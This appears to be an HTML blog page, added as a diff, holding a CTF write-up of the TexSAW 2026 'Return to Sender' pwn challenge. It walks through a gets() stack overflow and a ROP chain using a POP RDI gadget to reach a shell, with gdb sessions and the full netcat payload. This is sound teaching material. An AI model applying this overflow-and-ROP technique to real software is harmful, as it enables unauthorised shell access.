@@ -1,0 +1,111 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> TexSAW 2026 - Return to Sender (PWN) | Pepperoni-Pwners </title> <meta name="author" content="Pepperoni Pwners"> <meta name="description" content="Privilege escalation and skip of a security test"> <meta name="keywords" content="ctf, zhaw"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%8D%95&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://pizzapwn.tech//blog/2026/TexSAW-Return-to-Sender/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Pepperoni-Pwners </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/news/">news </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">TexSAW 2026 - Return to Sender (PWN)</h1> <p class="post-meta"> Created on March 30, 2026 by Guillaume </p> <p class="post-tags"> <a href="/blog/2026"> <i class="fa-solid fa-calendar fa-sm"></i> 2026 </a>   ·   <a href="/blog/tag/writeups"> <i class="fa-solid fa-hashtag fa-sm"></i> writeups</a>   <a href="/blog/tag/pwn"> <i class="fa-solid fa-hashtag fa-sm"></i> pwn</a>   <a href="/blog/tag/texsawctf"> <i class="fa-solid fa-hashtag fa-sm"></i> texsawctf</a>   <a href="/blog/tag/rop"> <i class="fa-solid fa-hashtag fa-sm"></i> ROP</a>   ·   <a href="/blog/category/writeups"> <i class="fa-solid fa-tag fa-sm"></i> writeups</a>   <a href="/blog/category/pwn"> <i class="fa-solid fa-tag fa-sm"></i> pwn</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="challenge-overview">Challenge Overview</h2> <ul> <li> <strong>Name of the CTF Event:</strong> TexSAW 2026</li> <li> <strong>Challenge Name:</strong> Return to Sender</li> <li> <strong>Category:</strong> Pwn</li> <li> <strong>Provided Files / URL:</strong> <code class="language-plaintext highlighter-rouge">chall</code>, <code class="language-plaintext highlighter-rouge">nc 143.198.163.4 15858</code> </li> <li> <strong>Goal:</strong> Find the flag.</li> </ul> <h2 id="initial-analysis">Initial Analysis</h2> <p>I started by importing the binary file into Ghidra where I was able to identify 6 functions :</p> <ul> <li> <code class="language-plaintext highlighter-rouge">avenue</code>, <code class="language-plaintext highlighter-rouge">boulevard</code> and <code class="language-plaintext highlighter-rouge">court</code> : those only print a string.</li> <li> <code class="language-plaintext highlighter-rouge">deliver</code> : uses <code class="language-plaintext highlighter-rouge">gets</code> to get an input and uses that input to launch one of the previous functions or none of them if the input isn’t correct -&gt; possible overflow.</li> <li> <code class="language-plaintext highlighter-rouge">drive</code> : a function opening a shell if the parameter contains the right value. However, this function is never called, so calling it is my first goal.</li> <li> <code class="language-plaintext highlighter-rouge">main</code> : clears IO buffers then launches <code class="language-plaintext highlighter-rouge">deliver</code>.</li> <li> <code class="language-plaintext highlighter-rouge">tool</code> : does apparently nothing.</li> </ul> <h1 id="solution-path">Solution Path</h1> <h2 id="step-1-getting-into-the-drive-function">Step 1: Getting into the <code class="language-plaintext highlighter-rouge">drive</code> function</h2> <p>Since I know that I can overflow with the input in <code class="language-plaintext highlighter-rouge">deliver</code>, I launched gdb to view the state of the stack after entering the input to see what I could override.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/16x <span class="nv">$sp</span>
+0x7fffffffe0e0:	0x00000061	0x00000000	0xffffe258	0x00007fff
+0x7fffffffe0f0:	0x00000001	0x00000000	0xf7ffd000	0x00007fff
+0x7fffffffe100:	0xffffe120	0x00007fff	0x004013c0	0x00000000
+0x7fffffffe110:	0xffffe258	0x00007fff	0x00000000	0x00000001
+</code></pre></div></div> <p>Here we can see the only <code class="language-plaintext highlighter-rouge">a</code> I inputted at the first byte after the stack pointer and 40 bytes after the stack pointer there is <code class="language-plaintext highlighter-rouge">0x004013c0</code>, this is the return address, so by changing it to the address of <code class="language-plaintext highlighter-rouge">drive</code> (<code class="language-plaintext highlighter-rouge">0x401211</code>) I should be able to access it.<br> I tried this hypothesis directly in gdb :</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) set {int}($sp + 40) = 0x401211
+(gdb) n
+Single stepping until exit from function deliver,
+which has no line number information.
+Sorry, we couldn't deliver your package. Returning to sender...
+
+0x0000000000401211 in drive ()
+(gdb)
+</code></pre></div></div> <p>So this works very well, but now I need to call the function with the right parameter to go into this <code class="language-plaintext highlighter-rouge">if</code> :</p> <pre><code class="language-C">if (param_1 == 0x48435344) {
+	puts("Success! Secret package delivered.\n");
+	system("/bin/sh");
+}
+</code></pre> <h2 id="step-2-calling-drive-with-0x48435344-as-parameter">Step 2: Calling <code class="language-plaintext highlighter-rouge">drive</code> with <code class="language-plaintext highlighter-rouge">0x48435344</code> as parameter</h2> <p>Since unfortunately functions parameters are in registers and not in the stack I need to find a way to put a value from the stack into <code class="language-plaintext highlighter-rouge">RDI</code> the register containing the parameter that I need. To do so I need something like the assembly instruction <code class="language-plaintext highlighter-rouge">POP RDI</code>, very conveniently the assembly code of the function <code class="language-plaintext highlighter-rouge">tool</code> is :</p> <pre><code class="language-asm">ENDBR64
+PUSH     RBP
+MOV      RBP,RSP
+POP      RDI
+RET
+</code></pre> <p>So now I need to call this function with <code class="language-plaintext highlighter-rouge">0x48435344</code> at the top of the stack after the call and override the return address once more to get into <code class="language-plaintext highlighter-rouge">drive</code>.</p> <p>To keep track of the stack, I inputted <code class="language-plaintext highlighter-rouge">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN</code> to fill up the first 40 bytes after the stack pointer, changed the address at <code class="language-plaintext highlighter-rouge">$sp + 40</code> to the address of <code class="language-plaintext highlighter-rouge">tool</code> (<code class="language-plaintext highlighter-rouge">0x4011b6</code>) and then printed the registers just after exiting <code class="language-plaintext highlighter-rouge">tool</code> :</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00000000004012a2 in deliver ()
+(gdb)
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN
+0x00000000004012a7 in deliver ()
+(gdb) set {int}($sp + 40) = 0x4011b6
+(gdb) x/16x $sp
+0x7fffffffe0e0:	0x64636261	0x68676665	0x6c6b6a69	0x706f6e6d
+0x7fffffffe0f0:	0x74737271	0x78777675	0x42417a79	0x46454443
+0x7fffffffe100:	0x4a494847	0x4e4d4c4b	0x004011b6	0x00000000
+0x7fffffffe110:	0xffffe258	0x00007fff	0x00000000	0x00000001
+(gdb) n
+Single stepping until exit from function deliver,
+which has no line number information.
+Sorry, we couldn't deliver your package. Returning to sender...
+
+0x00000000004011b6 in tool ()
+(gdb) n
+Single stepping until exit from function tool,
+which has no line number information.
+0x00007fffffffe258 in ?? ()
+(gdb) info reg
+...
+rdi            0x4e4d4c4b4a494847  5642249794417674311
+</code></pre></div></div> <p>So after <code class="language-plaintext highlighter-rouge">tool</code>, we are now in <code class="language-plaintext highlighter-rouge">0x00007fffffffe258</code> which correspond the 8 bytes starting at <code class="language-plaintext highlighter-rouge">$sp + 48</code> in <code class="language-plaintext highlighter-rouge">deliver</code> and rdi is containing <code class="language-plaintext highlighter-rouge">0x4e4d4c4b4a494847</code> which correspond to the 8 bytes starting at <code class="language-plaintext highlighter-rouge">$sp + 32</code>.</p> <p>I can now quickly verify in gdb these offsets are the correct ones :</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00000000004012a7 in deliver ()
+(gdb) set {int}($sp + 32) = 0x48435344
+(gdb) set {int}($sp + 36) = 0x0
+(gdb) set {int}($sp + 40) = 0x4011b6
+(gdb) set {int}($sp + 48) = 0x401211
+(gdb) set {int}($sp + 52) = 0x0
+(gdb) x/16x $sp
+0x7fffffffe0e0:	0x00000061	0x00000000	0xffffe258	0x00007fff
+0x7fffffffe0f0:	0x00000001	0x00000000	0xf7ffd000	0x00007fff
+0x7fffffffe100:	0x48435344	0x00000000	0x004011b6	0x00000000
+0x7fffffffe110:	0x00401211	0x00000000	0x00000000	0x00000001
+(gdb) n
+Single stepping until exit from function deliver,
+which has no line number information.
+Sorry, we couldn't deliver your package. Returning to sender...
+
+0x00000000004011b6 in tool ()
+(gdb)
+Single stepping until exit from function tool,
+which has no line number information.
+0x0000000000401211 in drive ()
+(gdb)
+Single stepping until exit from function drive,
+which has no line number information.
+Attempting secret delivery to 3 Dangerous Drive...
+
+Success! Secret package delivered.
+
+[Detaching after vfork from child process 281986]
+sh-5.3$
+</code></pre></div></div> <p>This indeed allows us to get into the <code class="language-plaintext highlighter-rouge">if</code> and to get a shell.</p> <h1 id="exploit">Exploit</h1> <p>I only need to craft a payload and pipe it to netcat to get the flag.</p> <p>I started with this payload (with some addresses written in reverse because the CPU is in little endian) :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print <span class="s2">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\n</span><span class="s2">cat flag.txt</span><span class="se">\n</span><span class="s2">"</span> | nc 143.198.163.4 15858
+Our modern and highly secure postal service never fails to deliver your package.
+
+Where would you like to send your package?
+
+Some Options:
+0 Address Avenue
+1 Buffer Boulevard
+2 Canary Court
+
+Sorry, we couldn t deliver your package. Returning to sender...
+
+Attempting secret delivery to 3 Dangerous Drive...
+
+Success! Secret package delivered.
+
+<span class="nb">ls
+ls
+pwd</span>
+^C
+</code></pre></div></div> <p>It was kind of successful but the shell wasn’t registering my inputs, so I added them directly into the payload :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print <span class="s2">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\n</span><span class="s2">ls</span><span class="se">\n</span><span class="s2">"</span> | nc 143.198.163.4 15858
+
+...
+
+flag.txt
+run
+</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print <span class="s2">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\n</span><span class="s2">cat flag.txt</span><span class="se">\n</span><span class="s2">"</span> | nc 143.198.163.4 15858
+
+...
+
+texsaw<span class="o">{</span>...<span class="o">}</span>
+</code></pre></div></div> </div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2026 Pepperoni Pwners. Pepperoni-Pwners. All rights reserved. <a href="https://pizzapwn.tech//impressum">Impressum</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?c15de51d4bb57887caa2c21988d97279"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>
